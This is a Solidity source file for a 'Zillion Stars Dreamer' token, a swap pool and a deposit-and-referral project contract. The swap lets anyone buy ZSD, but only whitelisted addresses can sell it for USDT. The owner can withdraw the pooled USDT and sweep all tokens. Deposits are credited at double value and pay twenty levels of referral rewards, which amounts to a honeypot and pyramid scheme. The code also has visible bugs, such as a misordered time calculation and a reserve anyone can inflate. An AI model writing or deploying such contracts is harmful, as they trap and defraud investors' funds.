// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ZSD is ERC20{

     constructor ()ERC20("Zillion Stars Dreamer", "ZSD"){
        _mint(msg.sender, 1680_000_000 * 10 ** decimals());
        //_mint(msg.sender, 1512_000_000  * 10 ** decimals());
        //_mint(admin, 168_000_000  * 10 ** decimals());
    }

     function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
}

contract ZSDSWap{

    address private owner;

    uint256 public usdtReserve;
    
    uint256 public zsdReserve;

    address public projectUSDTPool = 0x9C738E2ae6b7162d8148C8935D36AE592b6648D8;

    mapping(address => bool) public whitelist;
    
    IERC20 usdtToken = IERC20(0x55d398326f99059fF775485246999027B3197955);
    
    IERC20 zsdtToken;

    modifier onlyAdmin() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    constructor (address _zsdtToken){
        owner = msg.sender;
        whitelist[msg.sender] = true;
        zsdtToken = IERC20(_zsdtToken ) ; 
    }


    function addLiquidity(uint256 amountusdtToken, uint256 amountzsdtToken) external onlyAdmin() {
        require(amountusdtToken > 0 && amountzsdtToken > 0, "Invalid amounts");

        
        if (usdtReserve == 0 && zsdReserve == 0) {
            // 初始化流动性
            usdtReserve = amountusdtToken;
            zsdReserve = amountzsdtToken;
        } else {
            // 按照现有比例添加流动性
            require((amountusdtToken * zsdReserve) == (amountzsdtToken * usdtReserve), "Invalid token amounts");

            usdtReserve += amountusdtToken;
            zsdReserve += amountzsdtToken;
        }

        // 转移代币到合约
        require(usdtToken.transferFrom(msg.sender, address(this), amountusdtToken), "usdtToken transfer failed");
        require(zsdtToken.transferFrom(msg.sender, address(this), amountzsdtToken), "zsdtToken transfer failed");
    }

    // 代币1（USDT）兑换代币2（ZSD）
    function usdtTokenTozsdtTokenSwap(uint256 amountusdtToken) external {
        require(amountusdtToken > 0, "Invalid usdtToken amount");

        
        uint256 amountzsdtToken = getAmountOut(amountusdtToken, usdtReserve, zsdReserve);
        require(amountzsdtToken <= zsdReserve, "Insufficient liquidity");

        usdtReserve += amountusdtToken;
        zsdReserve -= amountzsdtToken;

        // 转移代币到合约
        require(usdtToken.transferFrom(msg.sender, address(this), amountusdtToken), "usdtToken transfer failed");
        require(zsdtToken.transfer(msg.sender, amountzsdtToken), "zsdtToken transfer failed");
    }

    // 代币2（ZSD）兑换代币1（USDT）
    function zsdtTokenTousdtTokenSwap(uint256 amountzsdtToken) external {
        require(amountzsdtToken > 0, "Invalid zsdtToken amount");
        require(whitelist[msg.sender], "Not authorized");
        
        uint256 amountusdtToken = getAmountOut(amountzsdtToken, zsdReserve, usdtReserve);
        require(amountusdtToken <= usdtReserve, "Insufficient liquidity");

        zsdReserve += amountzsdtToken;
        usdtReserve -= amountusdtToken;

        // 转移代币到合约
        require(zsdtToken.transferFrom(msg.sender, address(this), amountzsdtToken), "zsdtToken transfer failed");
        require(usdtToken.transfer(msg.sender, amountusdtToken * 95 / 100), "usdtToken transfer failed");
        require(usdtToken.transfer(projectUSDTPool , amountusdtToken * 5 / 100), "usdtToken fee transfer failed");
    }

    // 根据恒定乘积公式计算输出数量
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 1000; 
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function addToWhitelist(address _user) external onlyAdmin {
        whitelist[_user] = true;
    }

    function removeFromWhitelist(address _user) external onlyAdmin {
        whitelist[_user] = false;
    }

    function getAmountZSDOut(uint256 usdtAmount ) public view returns (uint256) {
        return getAmountOut(usdtAmount , usdtReserve, zsdReserve);
    }

    function addUSDT(uint256 usdtAmount) external {
        require(usdtAmount > 0, "Invalid usdtToken amount");
        usdtReserve += usdtAmount;
    }

        //提走所有的代币
    function withdrawToken(uint256 usdtAmount) external onlyAdmin {
        usdtToken.transfer(owner,usdtAmount);
    }

}

contract ZSDProject{

    struct UserDesp{
        address referrer;
        uint256 referralCount;
        uint256 withdrawUSDTBalances;
        uint256 withdrawZSDBalances;
        uint256 lastActionTime ;

    }
    address private owner;
    uint256 public totalHolders; 
    uint256 public totalDeposits = 100; 

    //总充值人数
    mapping(uint=> address ) public holders;
    mapping(address => UserDesp) public users;
    mapping(uint=> address ) public depositList;

        //总注册人数
    uint public totalRegisters; 
    mapping(uint=> address ) public registers;
    mapping(address => bool) public registered;

    ZSD public zsdtToken;
    ZSDSWap public swap;

    //USDT
    IERC20 public usdtToken = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address public projectAdminTPool = 0xD4B7125Cfeba67e959bFAc8eb18483b35d42F5Af;
    address public projectZSDTPool = 0x41A705e59878a64bdAe548049b72b638B8555a27;
    address public projectDropPool = 0xe4aE93dE5163f92448f5C7E199540359F84647b9;


    uint public constant ONE_DAY = 24 hours;

    event Registered(address indexed user, address indexed referrer);
    event DepositUSDTFunds(address indexed user, uint256 indexed  usdtAmount );
    event DepositUSDTANDZSDFunds( address indexed user,uint256 indexed usdtAmount, uint256 indexed  zsdAmount );
    event refereWared( address indexed user,address indexed refer,  uint256 indexed  usdtAmount );
    event WithdraZSDFunds(address indexed user, uint256 indexed  usdtAmount );

    modifier onlyAdmin() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    constructor (address _zsdAddress,address _zsdSwapAddress){
        //合约管理员
        owner = msg.sender;

        registers[totalRegisters] = msg.sender;

        registered[msg.sender] = true;

        users[msg.sender] = UserDesp({
            referrer: address(this),
            referralCount: 0,
            withdrawUSDTBalances: 1,
            withdrawZSDBalances: 0,
            lastActionTime: 0 
        });

        zsdtToken = ZSD(_zsdAddress);
        swap = ZSDSWap(_zsdSwapAddress);
    }

    //提走所有的代币
    function withdrawToken(address tokenAddress) external onlyAdmin {
        IERC20(tokenAddress).transfer(owner,IERC20(tokenAddress).balanceOf(address(this)));
    }

    //帮助别人充值
    function addusdt(address useraddress, uint256 usdtAmount) public  {
               //必须是已经注册的用户
        require(registered[msg.sender], "User  not  registered");

        //USDT
        // 确保合约有足够的余量从 msg.sender 转移代币
        uint256 allowance = usdtToken.allowance(msg.sender, address(this));

        require(allowance >= usdtAmount, "ERC20InsufficientAllowance: allowance is less than the required USDT amount");

        usdtToken.transferFrom(msg.sender, address(this), usdtAmount);

        users[useraddress].withdrawUSDTBalances += usdtAmount * 2;

        
    }

    //新用户注册，参数，推荐人地址
    function register(address referrer) public {

        //邀请人必须已经投资过
        require(users[referrer].withdrawUSDTBalances > 0, "referrer has not deposited");
        //用户没有注册过
        require(!registered[msg.sender], "User already registered");
        //邀请人和用户不是同一个人
        require(referrer != msg.sender, "You cannot refer yourself");

        users[msg.sender] = UserDesp({
            referrer: referrer,
            referralCount: 0,
            //用户可提的USDT
            withdrawUSDTBalances: 0,
            withdrawZSDBalances: 0,
            lastActionTime: 0 
        });

        if (registered[referrer]) {
            users[referrer].referralCount++;
        }

        totalRegisters++;

        registers[totalRegisters] = msg.sender;

        registered[msg.sender] = true;

        emit Registered(msg.sender, referrer);
    }

    //获取上级推荐人
    function getReferrer(address user) public view returns (address) {
        return users[user].referrer;
    }

    //获取推广团队人数
    function getReferralCount(address user) public view returns (uint256) {
        return users[user].referralCount;
    }
    
    function depositUSDTFunds(uint256 usdtAmount ) public {
        //必须是已经注册的用户
        require(registered[msg.sender], "User not registered");
        
         uint256 temp = usdtAmount;
        //USDT
        // 确保合约有足够的余量从 msg.sender 转移代币
        uint256 allowance = usdtToken.allowance(msg.sender, address(this));

        require(allowance >= usdtAmount, "ERC20InsufficientAllowance: allowance is less than the required USDT amount");

        // 将USDT从 msg.sender 转移到本合约
        bool success = usdtToken.transferFrom(msg.sender, address(this), usdtAmount);

        users[msg.sender].withdrawUSDTBalances +=    usdtAmount * 2;
        //项目方 5 %
        require(success, "USDT transfer fail");

        uint256 projectFee = usdtAmount * 5 / 100;

        usdtToken.transfer(projectAdminTPool,projectFee);

        temp -= projectFee;

        uint256 zsdAmount = swap.getAmountZSDOut(projectFee);
        usdtToken.approve(address(swap), projectFee);
        swap.usdtTokenTozsdtTokenSwap(projectFee);
        zsdtToken.burn(zsdAmount);

        temp -= projectFee;

        swap.addUSDT(usdtAmount * 45 / 100);
        usdtToken.transfer(address(swap), usdtAmount * 45 / 100);

        temp -= usdtAmount * 45 / 100;
        //直推奖励
        address referrer =  getReferrer(msg.sender);

        if(users[msg.sender].withdrawUSDTBalances >= users[referrer].withdrawUSDTBalances){

            usdtToken.transfer( referrer, users[referrer].withdrawUSDTBalances * 5 / 100 );

            temp -= users[referrer].withdrawUSDTBalances * 5 / 100;
            
            emit refereWared( msg.sender,referrer,  users[referrer].withdrawUSDTBalances * 5 / 100 );

            usdtToken.transfer(projectDropPool, (users[msg.sender].withdrawUSDTBalances - users[referrer].withdrawUSDTBalances ) * 5 / 100 );
            
            temp -= ((users[msg.sender].withdrawUSDTBalances - users[referrer].withdrawUSDTBalances ) * 5 / 100);

        }else{
            usdtToken.transfer( referrer, usdtAmount * 10 / 100 );

            temp -= usdtAmount * 10 / 100 ;

            emit refereWared( msg.sender,referrer,  usdtAmount * 10 / 100 );
        }
            
        if(users[msg.sender].lastActionTime == 0){
            //间推奖励
            for (uint i = 1; i <= 20; i++) {
                // 
                referrer =  getReferrer(referrer);

                if(address(0) == referrer){
                    break;
                }
                //用户的算力
                if(users[msg.sender].withdrawUSDTBalances  >= users[referrer].withdrawUSDTBalances){


                    usdtToken.transfer( referrer, users[referrer].withdrawUSDTBalances * 5/ 1000 );

                    temp -=  users[referrer].withdrawUSDTBalances * 5/ 1000 ;
                    
                    emit refereWared( msg.sender,referrer,  users[referrer].withdrawUSDTBalances * 5/ 1000  );
                    
                    usdtToken.transfer(projectDropPool, (users[msg.sender].withdrawUSDTBalances - users[referrer].withdrawUSDTBalances ) * 5 / 1000 );

                    temp -= (users[msg.sender].withdrawUSDTBalances - users[referrer].withdrawUSDTBalances ) * 5 / 1000  ;

                    
                }else{

                    usdtToken.transfer( referrer, usdtAmount * 10/ 1000 );


                    temp -=   usdtAmount * 10/ 1000 ;

                    emit refereWared( msg.sender,referrer,  usdtAmount * 10 / 100 );
                }
            }
            
            
            //时间算力 10 0.00002 
            for (uint j = totalDeposits; j >= totalDeposits - 15 ; j--) {
                
                address deposter = depositList[j];

                if(address(0) != deposter){
                
                    if(users[msg.sender].withdrawUSDTBalances  >= users[deposter].withdrawUSDTBalances){

                        usdtToken.transfer( deposter, users[deposter].withdrawUSDTBalances * 5/ 1000 );

                        temp -=  users[deposter].withdrawUSDTBalances * 5/ 1000 ;

                        emit refereWared( msg.sender,referrer,  users[deposter].withdrawUSDTBalances * 5/ 1000  );
                        
                        usdtToken.transfer(projectDropPool, (users[msg.sender].withdrawUSDTBalances - users[deposter].withdrawUSDTBalances ) * 5 / 1000 );

                        temp -= (users[msg.sender].withdrawUSDTBalances - users[deposter].withdrawUSDTBalances ) * 5 / 1000 ;


                    }else{
                
                        usdtToken.transfer( deposter, usdtAmount * 10/ 1000 );

                        temp -= usdtAmount * 10/ 1000 ;
                        
                        emit refereWared( msg.sender,referrer, usdtAmount * 10/ 1000 );
                        
                    }
                }
            }

            users[msg.sender].lastActionTime = block.timestamp;
            
            totalDeposits++;

            depositList[totalDeposits] = msg.sender;

            holders[totalHolders] = msg.sender;
        }
       
        emit DepositUSDTFunds(msg.sender,usdtAmount);

        usdtToken.transfer(projectDropPool, temp);

    }

    //充值USDT 前提条件是用户必须已经授权本合约从USDT合约划转账务
    function depositUSDTANDZSDFunds(uint256 usdtAmount ) public {
        //必须是已经注册的用户
        require(registered[msg.sender], "User already registered");

        uint256 zsdAmount = swap.getAmountZSDOut(( usdtAmount / 3 )* 7);


        usdtToken.transferFrom( msg.sender, address(this),usdtAmount);
        
        zsdtToken.transferFrom( msg.sender, address(this),zsdAmount);

        users[msg.sender].withdrawZSDBalances +=   zsdAmount * 3;
        users[msg.sender].withdrawUSDTBalances +=   usdtAmount * 2;

        zsdtToken.burn(zsdAmount * 95 / 100);

        zsdtToken.transfer(projectZSDTPool, zsdAmount * 5 / 100 );


        uint256 tempZsdAmount =  swap.getAmountZSDOut(usdtAmount * 10 / 100);  
        usdtToken.approve(address(swap), usdtAmount * 10 / 100);
        swap.usdtTokenTozsdtTokenSwap( usdtAmount * 10 / 100);
        zsdtToken.burn(tempZsdAmount);

        swap.addUSDT(usdtAmount * 90 / 100);
        usdtToken.transfer(address(swap), usdtAmount * 90 / 100);

        if(users[msg.sender].lastActionTime == 0){
            users[msg.sender].lastActionTime = block.timestamp;
            totalDeposits++;
            depositList[totalDeposits] = msg.sender;
        }


        emit DepositUSDTANDZSDFunds(msg.sender,usdtAmount,zsdAmount);

    }

    //用户提走 zsd
    function withdraZSDFunds() public{

        uint256 userdays =  block.timestamp -  users[msg.sender].lastActionTime / ONE_DAY;

        uint256 withdrawZSDAmount = (users[msg.sender].withdrawUSDTBalances * userdays * 5 /1000 )+ ( users[msg.sender].withdrawZSDBalances * userdays * 5 /1000) ;
        
        zsdtToken.transfer( msg.sender, withdrawZSDAmount * 95 /100);

        zsdtToken.transfer( projectZSDTPool, withdrawZSDAmount * 5 /100);

        users[msg.sender].withdrawUSDTBalances -= (users[msg.sender].withdrawUSDTBalances * userdays * 5 /1000 );
        users[msg.sender].withdrawZSDBalances -= (users[msg.sender].withdrawZSDBalances * userdays * 5 /1000 );

        emit WithdraZSDFunds(msg.sender,withdrawZSDAmount);
    }

    
    
}